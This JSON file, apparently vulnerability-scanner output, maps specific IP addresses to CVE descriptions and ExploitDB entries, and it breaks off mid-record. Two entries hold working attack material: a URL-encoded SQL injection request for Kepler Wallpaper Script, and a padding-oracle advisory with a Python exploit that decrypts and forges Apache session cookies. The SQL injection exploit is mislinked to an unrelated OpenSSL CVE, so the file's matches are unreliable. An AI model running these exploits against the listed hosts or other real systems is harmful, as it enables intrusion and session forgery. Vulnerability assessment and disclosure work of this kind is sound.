{
    "152.1.0.52": {
        "CVE-2016-7124": [
            {
                "source": "CVE",
                "_id": "2016-7124",
                "description": "ext/standard/var_unserializer.c in PHP before 5.6.25 and 7.x before 7.0.10 mishandles certain invalid objects, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via crafted serialized data that leads to a (1) __destruct call or (2) magic method call.",
                "osvdb": [],
                "bid": [
                    92756
                ],
                "cve": [
                    "CVE-2016-7124"
                ],
                "msb": []
            }
        ],
        "CVE-2016-7125": [
            {
                "source": "CVE",
                "_id": "2016-7125",
                "description": "ext/session/session.c in PHP before 5.6.25 and 7.x before 7.0.10 skips invalid session names in a way that triggers incorrect parsing, which allows remote attackers to inject arbitrary-type session data by leveraging control of a session name, as demonstrated by object injection.",
                "osvdb": [],
                "bid": [
                    92552
                ],
                "cve": [
                    "CVE-2016-7125"
                ],
                "msb": []
            }
        ],
        "CVE-2016-7126": [
            {
                "source": "CVE",
                "_id": "2016-7126",
                "description": "The imagetruecolortopalette function in ext/gd/gd.c in PHP before 5.6.25 and 7.x before 7.0.10 does not properly validate the number of colors, which allows remote attackers to cause a denial of service (select_colors allocation error and out-of-bounds write) or possibly have unspecified other impact via a large value in the third argument.",
                "osvdb": [],
                "bid": [
                    92755
                ],
                "cve": [
                    "CVE-2016-7126"
                ],
                "msb": []
            }
        ],
        "CVE-2016-7127": [
            {
                "source": "CVE",
                "_id": "2016-7127",
                "description": "The imagegammacorrect function in ext/gd/gd.c in PHP before 5.6.25 and 7.x before 7.0.10 does not properly validate gamma values, which allows remote attackers to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact by providing different signs for the second and third arguments.",
                "osvdb": [],
                "bid": [
                    92757
                ],
                "cve": [
                    "CVE-2016-7127"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10549": [
            {
                "source": "CVE",
                "_id": "2018-10549",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. exif_read_data in ext/exif/exif.c has an out-of-bounds read for crafted JPEG data because exif_iif_add_value mishandles the case of a MakerNote that lacks a final '\\0' character.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10549"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10548": [
            {
                "source": "CVE",
                "_id": "2018-10548",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. ext/ldap/ldap.c allows remote LDAP servers to cause a denial of service (NULL pointer dereference and application crash) because of mishandling of the ldap_get_dn return value.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10548"
                ],
                "msb": []
            }
        ]
    },
    "152.1.0.83": {
        "CVE-2019-1559": [
            {
                "source": "CVE",
                "_id": "2019-1559",
                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
                "osvdb": [],
                "bid": [
                    107174
                ],
                "cve": [
                    "CVE-2019-1559"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
                "author": "Ihsan Sencan",
                "_id": 46207,
                "source": "ExploitDB",
                "platform": "php",
                "date": "2019-01-21T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 80
            }
        ]
    },
    "152.1.0.92": {
        "CVE-2019-1559": [
            {
                "source": "CVE",
                "_id": "2019-1559",
                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
                "osvdb": [],
                "bid": [
                    107174
                ],
                "cve": [
                    "CVE-2019-1559"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
                "author": "Ihsan Sencan",
                "_id": 46207,
                "source": "ExploitDB",
                "platform": "php",
                "date": "2019-01-21T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 80
            }
        ]
    },
    "152.1.0.181": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.1.4.10": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.1.4.173": {
        "CVE-2020-1927": []
    },
    "152.1.8.12": {
        "CVE-2018-10549": [
            {
                "source": "CVE",
                "_id": "2018-10549",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. exif_read_data in ext/exif/exif.c has an out-of-bounds read for crafted JPEG data because exif_iif_add_value mishandles the case of a MakerNote that lacks a final '\\0' character.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10549"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10548": [
            {
                "source": "CVE",
                "_id": "2018-10548",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. ext/ldap/ldap.c allows remote LDAP servers to cause a denial of service (NULL pointer dereference and application crash) because of mishandling of the ldap_get_dn return value.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10548"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10545": [
            {
                "source": "CVE",
                "_id": "2018-10545",
                "description": "An issue was discovered in PHP before 5.6.35, 7.0.x before 7.0.29, 7.1.x before 7.1.16, and 7.2.x before 7.2.4. Dumpable FPM child processes allow bypassing opcache access controls because fpm_unix.c makes a PR_SET_DUMPABLE prctl call, allowing one user (in a multiuser environment) to obtain sensitive information from the process memory of a second user's PHP applications by running gcore on the PID of the PHP-FPM worker process.",
                "osvdb": [],
                "bid": [
                    104022
                ],
                "cve": [
                    "CVE-2018-10545"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10547": [
            {
                "source": "CVE",
                "_id": "2018-10547",
                "description": "An issue was discovered in ext/phar/phar_object.c in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. There is Reflected XSS on the PHAR 403 and 404 error pages via request data of a request for a .phar file. NOTE: this vulnerability exists because of an incomplete fix for CVE-2018-5712.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-10547"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10546": [
            {
                "source": "CVE",
                "_id": "2018-10546",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. An infinite loop exists in ext/iconv/iconv.c because the iconv stream filter does not reject invalid multibyte sequences.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10546"
                ],
                "msb": []
            }
        ],
        "CVE-2016-0736": [
            {
                "source": "CVE",
                "_id": "2016-0736",
                "description": "In Apache HTTP Server versions 2.4.0 to 2.4.23, mod_session_crypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC.",
                "osvdb": [],
                "bid": [
                    95078
                ],
                "cve": [
                    "CVE-2016-0736"
                ],
                "msb": []
            },
            {
                "code": "'''\r\nAdvisory: Padding Oracle in Apache mod_session_crypto\r\n\r\nDuring a penetration test, RedTeam Pentesting discovered a Padding\r\nOracle vulnerability in mod_session_crypto of the Apache web server.\r\nThis vulnerability can be exploited to decrypt the session data and even\r\nencrypt attacker-specified data.\r\n\r\n\r\nDetails\r\n=======\r\n\r\nProduct: Apache HTTP Server mod_session_crypto\r\nAffected Versions: 2.3 to 2.5\r\nFixed Versions: 2.4.25\r\nVulnerability Type: Padding Oracle\r\nSecurity Risk: high\r\nVendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html\r\nVendor Status: fixed version released\r\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt\r\nAdvisory Status: published\r\nCVE: CVE-2016-0736\r\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736\r\n\r\n\r\nIntroduction\r\n============\r\n\r\nThe module mod_session_crypto of the Apache HTTP Server can be used in\r\nconjunction with the modules mod_session and mod_session_cookie to store\r\nsession data in an encrypted cookie within the users' browsers. This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256. Encryption is handled by\r\nthe function \"encrypt_string\":\r\n\r\nmodules/session/mod_session_crypto.c\r\n------------------------------------------------------------------------\r\n/**\r\n * Encrypt the string given as per the current config.\r\n *\r\n * Returns APR_SUCCESS if successful.\r\n */\r\nstatic apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,\r\n        session_crypto_dir_conf *dconf, const char *in, char **out)\r\n{\r\n[...]\r\n    apr_crypto_key_t *key = NULL;\r\n[...]\r\n    const unsigned char *iv = NULL;\r\n[...]\r\n\r\n    /* use a uuid as a salt value, and prepend it to our result */\r\n    apr_uuid_get(&salt);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_passphrase(&key, &ivSize, passphrase,\r\n            strlen(passphrase),\r\n            (unsigned char *) (&salt), sizeof(apr_uuid_t),\r\n            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);\r\n\r\n[...]\r\n\r\n    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);\r\n[...]\r\n    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,\r\n            strlen(in), block);\r\n[...]\r\n    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);\r\n[...]\r\n\r\n    /* prepend the salt and the iv to the result */\r\n    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));\r\n    memcpy(combined, &salt, sizeof(apr_uuid_t));\r\n    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);\r\n    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);\r\n\r\n    /* base64 encode the result */\r\n    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +\r\n                    sizeof(apr_uuid_t) + 1)\r\n            * sizeof(char));\r\n[...]\r\n    return res;\r\n}\r\n------------------------------------------------------------------------\r\n\r\nThe source code shows that an encryption key is derived from the\r\nconfigured password and a randomly chosen salt by calling the function\r\n\"apr_crypto_passphrase\". This function internally uses PBKDF2 to derive\r\nthe key. The data is then encrypted and the salt and IV prepended to the\r\nencrypted data. Before returning to the caller, the result is encoded as\r\nbase64.\r\n\r\nThis procedure does not guarantee integrity of the ciphertext, so the\r\nApache module is unable to detect whether a session sent back to the\r\nserver has been tampered with. Depending on the application this often\r\nmeans that attackers are able to exploit a Padding Oracle vulnerability.\r\nThis allows decrypting the session and encrypting arbitrary data chosen\r\nby the attacker.\r\n\r\n\r\nProof of Concept\r\n================\r\n\r\nThe vulnerability can be reproduced as follows. First, the modules\r\nmod_session, mod_session_crypto and mod_session_cookie are enabled and\r\nconfigured:\r\n\r\n------------------------------------------------------------------------\r\nSession On\r\nSessionEnv On\r\nSessionCookieName session path=/\r\nSessionHeader X-Replace-Session\r\nSessionCryptoPassphrase RedTeam\r\n------------------------------------------------------------------------\r\n\r\nIn addition, CGI scripts are enabled for a folder and the following CGI\r\nscript is saved as \"status.rb\" and is made available to clients:\r\n\r\n------------------------------------------------------------------------\r\n#!/usr/bin/env ruby\r\n\r\nrequire 'cgi'\r\n\r\ncgi = CGI.new\r\ndata = CGI.parse(ENV['HTTP_SESSION'])\r\n\r\nif data.has_key? 'username'\r\n        puts\r\n        puts \"your username is %s\" % data['username']\r\n        exit\r\nend\r\n\r\nputs \"X-Replace-Session: username=guest&timestamp=\" + Time.now.strftime(\"%s\")\r\nputs\r\nputs \"not logged in\"\r\n------------------------------------------------------------------------\r\n\r\nOnce the CGI script is correctly set up, the command-line HTTP client curl\r\ncan be used to access it:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Jan 2016 13:23:19 GMT\r\nServer: Apache/2.4.10 (Ubuntu)\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nCache-Control: no-cache\r\nSet-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ\r\n   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-ruby\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThe example shows that a new encrypted cookie with the name \"session\" is\r\nreturned, and the response body contains the text \"not logged in\".\r\nCalling the script again with the cookie just returned reveals that the\r\nusername in the session is set to \"guest\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is guest\r\n------------------------------------------------------------------------\r\n\r\nSending a modified cookie ending in \"u=\" instead of \"U=\" will invalidate\r\nthe padding at the end of the ciphertext, so the session cannot be\r\ndecrypted correctly and is therefore not passed to the CGI script, which\r\nreturns the text \"not logged in\" again:\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\\\r\nLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \\\r\nhttp://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nnot logged in\r\n------------------------------------------------------------------------\r\n\r\nThis verifies the existence of the Padding Oracle vulnerability. The\r\nPython library[1] python-paddingoracle was then used to implement\r\ndecrypting the session by exploiting the Padding Oracle vulnerability.\r\n\r\nexploit.py\r\n------------------------------------------------------------------------\r\n'''\r\n\r\nfrom paddingoracle import BadPaddingException, PaddingOracle\r\nfrom base64 import b64encode, b64decode\r\nimport requests\r\n\r\nclass PadBuster(PaddingOracle):\r\n    def __init__(self, valid_cookie, **kwargs):\r\n        super(PadBuster, self).__init__(**kwargs)\r\n        self.wait = kwargs.get('wait', 2.0)\r\n        self.valid_cookie = valid_cookie\r\n\r\n    def oracle(self, data, **kwargs):\r\n        v = b64encode(self.valid_cookie+data)\r\n\r\n        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',\r\n                cookies=dict(session=v), stream=False, timeout=5, verify=False)\r\n\r\n        if 'username' in response.content:\r\n            logging.debug('No padding exception raised on %r', v)\r\n            return\r\n\r\n        raise BadPaddingException\r\n\r\nif __name__ == '__main__':\r\n    import logging\r\n    import sys\r\n\r\n    if not sys.argv[2:]:\r\n        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'\r\n        sys.exit(1)\r\n\r\n    logging.basicConfig(level=logging.WARN)\r\n    mode = sys.argv[1]\r\n    session = b64decode(sys.argv[2])\r\n    padbuster = PadBuster(session)\r\n\r\n    if mode == \"decrypt\":\r\n        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])\r\n        print('Decrypted session:\\n%r' % cookie)\r\n    elif mode == \"encrypt\":\r\n        key = session[0:16]\r\n        plaintext = sys.argv[3]\r\n\r\n        s = padbuster.encrypt(plaintext, block_size=16)\r\n\r\n        data = b64encode(key+s[0:len(s)-16])\r\n        print('Encrypted session:\\n%s' % data)\r\n    else:\r\n        print \"invalid mode\"\r\n        sys.exit(1)\r\n\r\n'''\r\n------------------------------------------------------------------------\r\n\r\nThis Python script can then be used to decrypt the session:\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=\r\nDecrypted session:\r\nb'username=guest&timestamp=1453282205\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r\\r'\r\n\r\nreal    6m43.088s\r\nuser    0m15.464s\r\nsys 0m0.976s\r\n------------------------------------------------------------------------\r\n\r\nIn this sample application, the username and a timestamp are included in\r\nthe session data. The Python script can also be used to encrypt a new\r\nsession containing the username \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\\\r\nHztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\\\r\nRU= username=admin\r\n\r\nEncrypted session:\r\nsxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY\r\n\r\nreal3m38.002s\r\nusers0m8.536s\r\nsys0m0.512s\r\n\r\n------------------------------------------------------------------------\r\n\r\nSending this newly encrypted session to the server shows that the\r\nusername is now \"admin\":\r\n\r\n------------------------------------------------------------------------\r\n$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\\\r\nzmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb\r\n\r\nyour username is admin\r\n------------------------------------------------------------------------\r\n\r\n\r\nWorkaround\r\n==========\r\n\r\nUse a different means to store the session, e.g. in a database by using\r\nmod_session_dbd.\r\n\r\n\r\nFix\r\n===\r\n\r\nUpdate to Apache HTTP version 2.4.25 (see [2]).\r\n\r\n\r\nSecurity Risk\r\n=============\r\n\r\nApplications which use mod_session_crypto usually store sensitive values\r\nin the session and rely on an attacker's inability to decrypt or modify\r\nthe session. Successful exploitation of the Padding Oracle vulnerability\r\nsubverts this mechanism and allows to construct sessions with arbitrary\r\nattacker-specified content. Depending on the application this may\r\ncompletely subvert the application's security. Therefore, this\r\nvulnerability poses a high risk.\r\n\r\n\r\nTimeline\r\n========\r\n\r\n2016-01-11 Vulnerability identified\r\n2016-01-12 Customer approved disclosure to vendor\r\n2016-01-12 CVE number requested\r\n2016-01-20 Vendor notified\r\n2016-01-22 Vendor confirmed the vulnerability\r\n2016-02-03 Vendor provided patch\r\n2016-02-04 Apache Security Team assigned CVE number\r\n2016-03-03 Requested status update from vendor, no response\r\n2016-05-02 Requested status update from vendor, no response\r\n2016-07-14 Requested status update and roadmap from vendor\r\n2016-07-21 Vendor confirms working on a new released and inquired whether the\r\n           patch fixes the vulnerability\r\n2016-07-22 RedTeam confirms\r\n2016-08-24 Requested status update from vendor\r\n2016-08-29 Vendor states that there is no concrete timeline\r\n2016-12-05 Vendor announces a release\r\n2016-12-20 Vendor released fixed version\r\n2016-12-23 Advisory released\r\n\r\n\r\nReferences\r\n==========\r\n\r\n[1] https://github.com/mwielgoszewski/python-paddingoracle\r\n[2] http://httpd.apache.org/security/vulnerabilities_24.html\r\n\r\n\r\nRedTeam Pentesting GmbH\r\n=======================\r\n\r\nRedTeam Pentesting offers individual penetration tests performed by a\r\nteam of specialised IT-security experts. Hereby, security weaknesses in\r\ncompany networks or products are uncovered and can be fixed immediately.\r\n\r\nAs there are only few experts in this field, RedTeam Pentesting wants to\r\nshare its knowledge and enhance the public knowledge with research in\r\nsecurity-related areas. The results are made available as public\r\nsecurity advisories.\r\n\r\nMore information about RedTeam Pentesting can be found at:\r\nhttps://www.redteam-pentesting.de/\r\n'''",
                "description": "Apache mod_session_crypto - Padding Oracle",
                "author": "RedTeam Pentesting GmbH",
                "_id": 40961,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2016-12-23T00:00:00+00:00",
                "cve": [
                    "CVE-2016-0736"
                ],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2015-3185": [
            {
                "source": "CVE",
                "_id": "2015-3185",
                "description": "The ap_some_auth_required function in server/request.c in the Apache HTTP Server 2.4.x before 2.4.14 does not consider that a Require directive may be associated with an authorization setting rather than an authentication setting, which allows remote attackers to bypass intended access restrictions in opportunistic circumstances by leveraging the presence of a module that relies on the 2.2 API behavior.",
                "osvdb": [],
                "bid": [
                    75965
                ],
                "cve": [
                    "CVE-2015-3185"
                ],
                "msb": []
            }
        ],
        "CVE-2015-3184": [
            {
                "source": "CVE",
                "_id": "2015-3184",
                "description": "mod_authz_svn in Apache Subversion 1.7.x before 1.7.21 and 1.8.x before 1.8.14, when using Apache httpd 2.4.x, does not properly restrict anonymous access, which allows remote anonymous users to read hidden files via the path name.",
                "osvdb": [],
                "bid": [
                    76274
                ],
                "cve": [
                    "CVE-2015-3184"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1312": [
            {
                "source": "CVE",
                "_id": "2018-1312",
                "description": "In Apache httpd 2.2.0 to 2.4.29, when generating an HTTP Digest authentication challenge, the nonce sent to prevent reply attacks was not correctly generated using a pseudo-random seed. In a cluster of servers using a common Digest authentication configuration, HTTP requests could be replayed across servers by an attacker without detection.",
                "osvdb": [],
                "bid": [
                    103524
                ],
                "cve": [
                    "CVE-2018-1312"
                ],
                "msb": []
            }
        ],
        "CVE-2018-14883": [
            {
                "source": "CVE",
                "_id": "2018-14883",
                "description": "An issue was discovered in PHP before 5.6.37, 7.0.x before 7.0.31, 7.1.x before 7.1.20, and 7.2.x before 7.2.8. An Integer Overflow leads to a heap-based buffer over-read in exif_thumbnail_extract of exif.c.",
                "osvdb": [],
                "bid": [
                    104871
                ],
                "cve": [
                    "CVE-2018-14883"
                ],
                "msb": []
            }
        ],
        "CVE-2018-15132": [
            {
                "source": "CVE",
                "_id": "2018-15132",
                "description": "An issue was discovered in ext/standard/link_win32.c in PHP before 5.6.37, 7.0.x before 7.0.31, 7.1.x before 7.1.20, and 7.2.x before 7.2.8. The linkinfo function on Windows doesn't implement the open_basedir check. This could be abused to find files on paths outside of the allowed directories.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2018-15132"
                ],
                "msb": []
            }
        ],
        "CVE-2019-9020": [
            {
                "source": "CVE",
                "_id": "2019-9020",
                "description": "An issue was discovered in PHP before 5.6.40, 7.x before 7.1.26, 7.2.x before 7.2.14, and 7.3.x before 7.3.1. Invalid input to the function xmlrpc_decode() can lead to an invalid memory access (heap out of bounds read or read after free). This is related to xml_elem_parse_buf in ext/xmlrpc/libxmlrpc/xml_element.c.",
                "osvdb": [],
                "bid": [
                    107156
                ],
                "cve": [
                    "CVE-2019-9020"
                ],
                "msb": []
            }
        ],
        "CVE-2016-4975": [
            {
